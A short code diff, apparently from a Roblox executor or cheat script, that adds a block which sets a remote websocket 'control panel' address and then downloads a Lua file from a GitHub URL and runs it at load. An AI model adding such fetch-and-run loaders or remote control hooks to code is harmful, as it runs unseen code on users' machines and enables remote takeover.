@@ -2,6 +2,11 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+task.spawn(function()
+getgenv().CPanelWebsocket="wss://cpanelwebsocket.onrender.com"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JustSomeGuest/Scripts/Main/Utilities/CPanel/Init.lua"))()
+end)
+
 local Env = (type(getgenv) == "function" and getgenv()) or shared or _G
 
 local function GetService(Name)
